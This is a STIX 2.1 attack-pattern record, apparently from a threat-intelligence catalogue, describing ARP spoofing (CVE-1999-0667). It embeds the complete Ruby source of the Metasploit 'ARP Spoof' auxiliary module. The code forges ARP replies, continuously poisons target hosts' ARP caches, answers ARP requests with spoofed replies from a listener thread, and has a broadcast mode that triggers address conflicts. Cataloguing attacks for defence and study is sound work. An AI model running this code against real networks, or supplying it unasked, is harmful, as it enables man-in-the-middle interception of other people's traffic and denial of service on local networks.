{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--35c88a1f-60e1-433a-a3a7-704c57783463",
    "created": "2024-08-14T16:32:55.00049Z",
    "modified": "2024-08-14T16:32:55.000494Z",
    "name": "ARP Spoof",
    "description": " Spoof ARP replies and poison remote ARP caches to conduct IP address spoofing or a denial of service. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/spoof/arp/arp_poisoning.rb",
            "external_id": "arp_poisoning.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-0667"
        },
        {
            "source_name": "reference",
            "url": "https://en.wikipedia.org/wiki/ARP_spoofing"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Capture\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'        => 'ARP Spoof',\n      'Description' => %q{\n        Spoof ARP replies and poison remote ARP caches to conduct IP address spoofing or a denial of service.\n      },\n      'Author'      => \t'amaloteaux', # msf rewrite\n                                      #tons of people\n      'License'     => MSF_LICENSE,\n      'References'     =>\n        [\n          ['OSVDB', '11169'],\n          ['CVE', '1999-0667'],\n          ['URL', 'https://en.wikipedia.org/wiki/ARP_spoofing']\n        ],\n      'DisclosureDate' => 'Dec 22 1999' #osvdb date\n    )\n\n    register_options([\n      OptString.new('SHOSTS',  \t[true, 'Spoofed ip addresses']),\n      OptString.new('SMAC',    \t[false, 'The spoofed mac']),\n      OptString.new('DHOSTS',  \t[true, 'Target ip addresses']),\n      OptString.new('INTERFACE', \t[false, 'The name of the interface']),\n      OptBool.new(  'BIDIRECTIONAL',\t[true, 'Spoof also the source with the dest',false]),\n      OptBool.new(  'AUTO_ADD',\t[true, 'Auto add new host when discovered by the listener',false]),\n      OptBool.new(  'LISTENER',    \t[true, 'Use an additional thread that will listen for arp requests to reply as fast as possible', true])\n    ])\n\n    register_advanced_options([\n      OptString.new('LOCALSMAC',    \t[false, 'The MAC address of the local interface to use for hosts detection, this is usefull only if you want to spoof to another host with SMAC']),\n      OptString.new('LOCALSIP',    \t[false, 'The IP address of the local interface to use for hosts detection']),\n      OptInt.new(   'PKT_DELAY',    \t[true, 'The delay in milliseconds between each packet during poisoning', 100]),\n      OptInt.new('TIMEOUT', [true, 'The number of seconds to wait for new data during host detection', 2]),\n      # This mode will generate address ip conflict pop up  on most systems\n      OptBool.new(  'BROADCAST',    \t[true, 'If set, the module will send replies on the broadcast address witout consideration of DHOSTS', false])\n    ])\n\n    deregister_options('SNAPLEN', 'FILTER', 'PCAPFILE','RHOST','SECRET','GATEWAY_PROBE_HOST','GATEWAY_PROBE_PORT')\n  end\n\n  def run\n    open_pcap({'SNAPLEN' => 68, 'FILTER' => \"arp[6:2] == 0x0002\"})\n    @netifaces = true\n    if not netifaces_implemented?\n      print_error(\"WARNING : Pcaprub is not uptodate, some functionality will not be available\")\n      @netifaces = false\n    end\n    @spoofing = false\n    # The local dst (and src) cache(s)\n    @dsthosts_cache = {}\n    @srchosts_cache = {}\n    # Some additional caches for autoadd feature\n    if datastore['AUTO_ADD']\n      @dsthosts_autoadd_cache = {}\n      if datastore['BIDIRECTIONAL']\n        @srchosts_autoadd_cache = {}\n      end\n    end\n\n    begin\n      @interface = datastore['INTERFACE'] || Pcap.lookupdev\n      # This is needed on windows cause we send interface directly to Pcap functions\n      @interface = get_interface_guid(@interface)\n      @smac = datastore['SMAC']\n      @smac ||= get_mac(@interface) if @netifaces\n      raise 'SMAC is not defined and can not be guessed' unless @smac\n      raise 'Source MAC is not in correct format' unless is_mac?(@smac)\n\n      @sip = datastore['LOCALSIP']\n      @sip ||= get_ipv4_addr(@interface) if @netifaces\n      raise \"LOCALSIP is not defined and can not be guessed\" unless @sip\n      raise \"LOCALSIP is not an ipv4 address\" unless Rex::Socket.is_ipv4?(@sip)\n\n      shosts_range  = Rex::Socket::RangeWalker.new(datastore['SHOSTS'])\n      @shosts = []\n      if datastore['BIDIRECTIONAL']\n        shosts_range.each{|shost| if Rex::Socket.is_ipv4?(shost) and shost != @sip then @shosts.push shost end}\n      else\n        shosts_range.each{|shost| if Rex::Socket.is_ipv4?(shost) then @shosts.push shost end}\n      end\n\n      if datastore['BROADCAST']\n        broadcast_spoof\n      else\n        arp_poisoning\n      end\n\n    rescue  =>  ex\n      print_error( ex.message)\n    ensure\n\n      if datastore['LISTENER']\n        @listener.kill if @listener\n      end\n\n      if capture and @spoofing and not datastore['BROADCAST']\n        print_status(\"RE-ARPing the victims...\")\n        3.times do\n          @dsthosts_cache.keys.sort.each do |dhost|\n            dmac = @dsthosts_cache[dhost]\n            if datastore['BIDIRECTIONAL']\n              @srchosts_cache.keys.sort.each do |shost|\n                smac = @srchosts_cache[shost]\n                if shost != dhost\n                  vprint_status(\"Sending arp packet for #{shost} to #{dhost}\")\n                  reply = buildreply(shost, smac, dhost, dmac)\n                  inject(reply)\n                  Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)\n                end\n              end\n            else\n              @shosts.each do |shost|\n                if shost != dhost\n                  vprint_status(\"Sending arp request for #{shost} to #{dhost}\")\n                  request = buildprobe(dhost, dmac, shost)\n                  inject(request)\n                  Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)\n                end\n              end\n            end\n          end\n          if datastore['BIDIRECTIONAL']\n            @srchosts_cache.keys.sort.each do |shost|\n              smac = @srchosts_cache[shost]\n              @dsthosts_cache.keys.sort.each do |dhost|\n                dmac = @dsthosts_cache[dhost]\n                if shost != dhost\n                  vprint_status(\"Sending arp packet for #{dhost} to #{shost}\")\n                  reply = buildreply(dhost, dmac, shost, smac)\n                  inject(reply)\n                  Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)\n                end\n              end\n            end\n          end\n        end # 3.times\n      end\n      close_pcap\n    end #begin/rescue/ensure\n  end\n\n  def broadcast_spoof\n    print_status(\"ARP poisoning in progress (broadcast)...\")\n    while(true)\n      @shosts.each do |shost|\n        vprint_status(\"Sending arp packet for #{shost} address\")\n        reply = buildreply(shost, @smac, '0.0.0.0', 'ff:ff:ff:ff:ff:ff')\n        inject(reply)\n        Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)\n      end\n    end\n  end\n\n  def arp_poisoning\n    lsmac = datastore['LOCALSMAC'] || @smac\n    raise 'Local Source Mac is not in correct format' unless is_mac?(lsmac)\n\n    dhosts_range = Rex::Socket::RangeWalker.new(datastore['DHOSTS'])\n    @dhosts = []\n    dhosts_range.each{|dhost| if Rex::Socket.is_ipv4?(dhost) and dhost != @sip then @dhosts.push(dhost) end}\n\n    # Build the local dest hosts cache\n    print_status(\"Building the destination hosts cache...\")\n    @dhosts.each do |dhost|\n      vprint_status(\"Sending arp packet to #{dhost}\")\n\n      probe = buildprobe(@sip, lsmac, dhost)\n      inject(probe)\n      while(reply = getreply())\n        next if not reply.is_arp?\n        # Without this check any arp request would be added to the cache\n        if @dhosts.include? reply.arp_saddr_ip\n          print_good(\"#{reply.arp_saddr_ip} appears to be up.\")\n          report_host(:host => reply.arp_saddr_ip, :mac=>reply.arp_saddr_mac)\n          @dsthosts_cache[reply.arp_saddr_ip] = reply.arp_saddr_mac\n        end\n      end\n\n    end\n    # Wait some few seconds for last packets\n    etime = Time.now.to_f + datastore['TIMEOUT']\n    while (Time.now.to_f < etime)\n      while(reply = getreply())\n        next if not reply.is_arp?\n        if @dhosts.include? reply.arp_saddr_ip\n          print_good(\"#{reply.arp_saddr_ip} appears to be up.\")\n          report_host(:host => reply.arp_saddr_ip, :mac=>reply.arp_saddr_mac)\n          @dsthosts_cache[reply.arp_saddr_ip] = reply.arp_saddr_mac\n        end\n      end\n      Kernel.select(nil, nil, nil, 0.50)\n    end\n    raise \"No hosts found\" unless @dsthosts_cache.length > 0\n\n    # Build the local src hosts cache\n    if datastore['BIDIRECTIONAL']\n      print_status(\"Building the source hosts cache for unknown source hosts...\")\n      @shosts.each do |shost|\n        if @dsthosts_cache.has_key? shost\n          vprint_status(\"Adding #{shost} from destination cache\")\n          @srchosts_cache[shost] = @dsthosts_cache[shost]\n          next\n        end\n        vprint_status(\"Sending arp packet to #{shost}\")\n        probe = buildprobe(@sip, lsmac, shost)\n        inject(probe)\n        while(reply = getreply())\n          next if not reply.is_arp?\n          if @shosts.include? reply.arp_saddr_ip\n            print_good(\"#{reply.arp_saddr_ip} appears to be up.\")\n            report_host(:host => reply.arp_saddr_ip, :mac=>reply.arp_saddr_mac)\n            @srchosts_cache[reply.arp_saddr_ip] = reply.arp_saddr_mac\n          end\n        end\n\n      end\n      # Wait some few seconds for last packets\n      etime = Time.now.to_f + datastore['TIMEOUT']\n      while (Time.now.to_f < etime)\n        while(reply = getreply())\n          next if not reply.is_arp?\n          if @shosts.include? reply.arp_saddr_ip\n            print_good(\"#{reply.arp_saddr_ip} appears to be up.\")\n            report_host(:host => reply.arp_saddr_ip, :mac=>reply.arp_saddr_mac)\n            @srchosts_cache[reply.arp_saddr_ip] = reply.arp_saddr_mac\n          end\n        end\n        Kernel.select(nil, nil, nil, 0.50)\n      end\n      raise \"No hosts found\" unless @srchosts_cache.length > 0\n    end\n\n    if datastore['AUTO_ADD']\n      @mutex_cache = Mutex.new\n    end\n\n    # Start the listener\n    if datastore['LISTENER']\n      start_listener(@dsthosts_cache, @srchosts_cache)\n    end\n    # Do the job until user interupt it\n    print_status(\"ARP poisoning in progress...\")\n    @spoofing = true\n    while(true)\n      if datastore['AUTO_ADD']\n        @mutex_cache.lock\n        if @dsthosts_autoadd_cache.length > 0\n          @dsthosts_cache.merge!(@dsthosts_autoadd_cache)\n          @dsthosts_autoadd_cache = {}\n        end\n        if datastore['BIDIRECTIONAL']\n          if @srchosts_autoadd_cache.length > 0\n            @srchosts_cache.merge!(@srchosts_autoadd_cache)\n            @srchosts_autoadd_cache = {}\n          end\n        end\n        @mutex_cache.unlock\n      end\n      @dsthosts_cache.keys.sort.each do |dhost|\n        dmac = @dsthosts_cache[dhost]\n        if datastore['BIDIRECTIONAL']\n          @srchosts_cache.keys.sort.each do |shost|\n            smac = @srchosts_cache[shost]\n            if shost != dhost\n              vprint_status(\"Sending arp packet for #{shost} to #{dhost}\")\n              reply = buildreply(shost, @smac, dhost, dmac)\n              inject(reply)\n              Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)\n            end\n          end\n        else\n          @shosts.each do |shost|\n            if shost != dhost\n              vprint_status(\"Sending arp packet for #{shost} to #{dhost}\")\n              reply = buildreply(shost, @smac, dhost, dmac)\n              inject(reply)\n              Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)\n            end\n          end\n        end\n      end\n\n      if datastore['BIDIRECTIONAL']\n        @srchosts_cache.keys.sort.each do |shost|\n          smac = @srchosts_cache[shost]\n          @dsthosts_cache.keys.sort.each do |dhost|\n            dmac = @dsthosts_cache[dhost]\n            if shost != dhost\n              vprint_status(\"Sending arp packet for #{dhost} to #{shost}\")\n              reply = buildreply(dhost, @smac, shost, smac)\n              inject(reply)\n              Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)\n            end\n          end\n        end\n      end\n    end\n  end\n\n\n  def is_mac?(mac)\n    if mac =~ /^([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}$/ then true\n    else false end\n  end\n\n  def buildprobe(shost, smac, dhost)\n    p = PacketFu::ARPPacket.new\n    p.eth_saddr = smac\n    p.eth_daddr = \"ff:ff:ff:ff:ff:ff\"\n    p.arp_opcode = 1\n    p.arp_daddr_mac = p.eth_daddr\n    p.arp_saddr_mac = p.eth_saddr\n    p.arp_saddr_ip = shost\n    p.arp_daddr_ip = dhost\n    p\n  end\n\n  def buildreply(shost, smac, dhost, dmac)\n    p = PacketFu::ARPPacket.new\n    p.eth_saddr = smac\n    p.eth_daddr = dmac\n    p.arp_opcode = 2 # ARP Reply\n    p.arp_daddr_mac = p.eth_daddr\n    p.arp_saddr_mac = p.eth_saddr\n    p.arp_saddr_ip = shost\n    p.arp_daddr_ip = dhost\n    p\n  end\n\n  def getreply\n    pkt_bytes = capture.next\n    return if not pkt_bytes\n    pkt = PacketFu::Packet.parse(pkt_bytes)\n    return unless pkt.is_arp?\n    return unless pkt.arp_opcode == 2\n    pkt\n  end\n\n  def start_listener(dsthosts_cache, srchosts_cache)\n\n    if datastore['BIDIRECTIONAL']\n      args = {:BIDIRECTIONAL => true,  :dhosts => dsthosts_cache.dup, :shosts => srchosts_cache.dup}\n    else\n      args = {:BIDIRECTIONAL => false, :dhosts => dsthosts_cache.dup, :shosts => @shosts.dup}\n    end\n    # To avoid any race condition in case of , even if actually those are never updated after the thread is launched\n    args[:AUTO_ADD] = datastore['AUTO_ADD']\n    args[:localip] = @sip.dup\n    @listener = Thread.new(args) do |args|\n      begin\n        # one more local copy\n        liste_src_ips = []\n        if args[:BIDIRECTIONAL]\n          args[:shosts].each_key {|address| liste_src_ips.push address}\n        else\n          args[:shosts].each {|address| liste_src_ips.push address}\n        end\n        liste_dst_ips = []\n        args[:dhosts].each_key {|address| liste_dst_ips.push address}\n        localip = args[:localip]\n\n        listener_capture = ::Pcap.open_live(@interface, 68, true, 0)\n        listener_capture.setfilter(\"arp[6:2] == 0x0001\")\n        while(true)\n          pkt_bytes = listener_capture.next\n          if pkt_bytes\n            pkt = PacketFu::Packet.parse(pkt_bytes)\n            if pkt.is_arp?\n              if pkt.arp_opcode == 1\n                # check if the source ip is in the dest hosts\n                if (liste_dst_ips.include? pkt.arp_saddr_ip and liste_src_ips.include? pkt.arp_daddr_ip) or\n                  (args[:BIDIRECTIONAL] and liste_dst_ips.include? pkt.arp_daddr_ip and liste_src_ips.include? pkt.arp_saddr_ip)\n                  vprint_status(\"Listener : Request from #{pkt.arp_saddr_ip} for #{pkt.arp_daddr_ip}\")\n                  reply = buildreply(pkt.arp_daddr_ip, @smac, pkt.arp_saddr_ip, pkt.eth_saddr)\n                  3.times{listener_capture.inject(reply.to_s)}\n                elsif args[:AUTO_ADD]\n                  if (@dhosts.include? pkt.arp_saddr_ip and not liste_dst_ips.include? pkt.arp_saddr_ip and\n                    pkt.arp_saddr_ip != localip)\n                    @mutex_cache.lock\n                    print_status(\"#{pkt.arp_saddr_ip} appears to be up.\")\n                    @dsthosts_autoadd_cache[pkt.arp_saddr_ip] = pkt.arp_saddr_mac\n                    liste_dst_ips.push pkt.arp_saddr_ip\n                    @mutex_cache.unlock\n                  elsif (args[:BIDIRECTIONAL] and @shosts.include? pkt.arp_saddr_ip and\n                    not liste_src_ips.include? pkt.arp_saddr_ip and pkt.arp_saddr_ip != localip)\n                    @mutex_cache.lock\n                    print_status(\"#{pkt.arp_saddr_ip} appears to be up.\")\n                    @srchosts_autoadd_cache[pkt.arp_saddr_ip] = pkt.arp_saddr_mac\n                    liste_src_ips.push pkt.arp_saddr_ip\n                    @mutex_cache.unlock\n                  end\n                end\n              end\n            end\n          end\n        end\n      rescue => ex\n        print_error(\"Listener Error: #{ex.message}\")\n        print_error(\"Listener Error: Listener is stopped\")\n      end\n    end\n    @listener.abort_on_exception = true\n  end\nend\n",
    "x_mitre_disclosure_date": "Dec 22 1999 #osvdb date"
}